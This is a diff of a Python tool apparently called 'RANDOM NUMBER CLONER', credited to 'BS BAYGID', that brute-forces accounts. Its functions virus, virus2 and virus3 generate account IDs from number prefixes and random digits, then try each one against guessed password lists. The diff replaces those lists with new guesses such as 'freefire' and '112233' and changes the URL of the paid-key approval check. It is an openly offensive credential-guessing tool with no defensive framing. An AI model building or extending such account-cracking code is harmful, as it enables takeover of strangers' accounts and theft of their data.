@@ -155,7 +155,7 @@ def menu_apikey():
     │ [✓] AUTHOR   : BS BAYGID         
     │ [✓] GITHUB   : BAYGID            
     │ [✓] WHATSAPP : +8801323176125       
-    │ [✓] VERSION  : 1.7.9                   
+    │ [✓] VERSION  : 1.8                   
     │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m
     └───────────────────────────────────────┘""")
   print(f"\t \033[1;32m Admin By BAYGID \033[1;37m ")
@@ -179,7 +179,7 @@ def menu_apikey():
   print(f"");time.sleep(2)
   print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
   try:
-    httpCaht = requests.get("https://github.com/BAYGID9/baygid/blob/main/Approve.txt").text
+    httpCaht = requests.get("https://github.com/BAYGID9/BAYGID-2/blob/main/BAYGID.txt").text
     if id in httpCaht:
       print("\033[1;92m   YOUR KEY APROVED  ");time.sleep(2)
       msg = str(os.geteuid())
@@ -305,7 +305,7 @@ def virus():
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,'free fire','freefire','112233','223344','123123','freefire1234','556677']
 			yaari.submit(a,uid,pwx,tl)
 	print(50*'_')
 	print(' [🔥] Crack process has been completed')
@@ -338,7 +338,7 @@ def virus2():
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,'free fire','freefire','112233','223344','123123','freefire1234','556677']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [😸 Crack process has been completed')
@@ -371,7 +371,7 @@ def virus3():
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,'free fire','freefire','112233','223344','123123','freefire1234','556677']
 			yaari.submit(c,uid,pwx,tl)
 	print(50*'_')
 	print(' [😳] Crack process has been completed')
